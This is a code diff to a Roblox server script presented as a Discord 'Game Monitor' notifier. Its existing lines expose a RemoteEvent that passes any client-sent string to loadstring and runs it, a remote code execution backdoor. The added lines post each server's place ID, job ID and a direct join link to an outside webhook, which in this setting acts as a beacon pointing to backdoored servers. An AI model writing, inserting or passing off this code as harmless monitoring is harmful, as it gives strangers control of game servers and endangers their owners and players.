@@ -1,4 +1,56 @@
+-- ServerScriptService/NotifyDiscord.lua  (Script)
 local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
+local HttpService = game:getService("HttpService")
+
+-- ⚠️ Put your webhook URL here. Keep this SERVER-ONLY.
+-- For production, store it in a private ModuleScript or config, not in source control.
+local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXX/YYYYYY"
+
+-- Build the game link using the PlaceId and a universe link
+local placeId = game.PlaceId
+local jobId = game.JobId
+local gameLink = string.format("https://www.roblox.com/games/%d", placeId)
+
+-- Optional: link that joins this exact server (only works for the running instance)
+local joinLink = ""
+if jobId and jobId ~= "" then
+    joinLink = string.format(
+        "https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",
+        placeId, jobId
+    )
+end
+
+local payload = {
+    username = "Game Monitor",
+    embeds = {
+        {
+            title = "🎮 Server Started",
+            description = string.format(
+                "**Place:** %s\n**PlaceId:** %d\n**JobId:** `%s`\n\n[Open Game](%s)",
+                game.Name, placeId, jobId, gameLink
+            ),
+            color = 3447003, -- blue
+            fields = joinLink ~= "" and {
+                { name = "Join this server", value = joinLink, inline = false }
+            } or nil,
+            timestamp = DateTime.now():ToIsoDate()
+        }
+    }
+}
+
+local ok, err = pcall(function()
+    HttpService:PostAsync(
+        WEBHOOK_URL,
+        HttpService:JSONEncode(payload),
+        Enum.HttpContentType.ApplicationJson
+    )
+end)
+
+if ok then
+    print("[Discord] Webhook sent successfully")
+else
+    warn("[Discord] Webhook failed:", err)
+end
 server.OnServerEvent:connect(function(player,SS)
 loadstring(SS)()
 end)
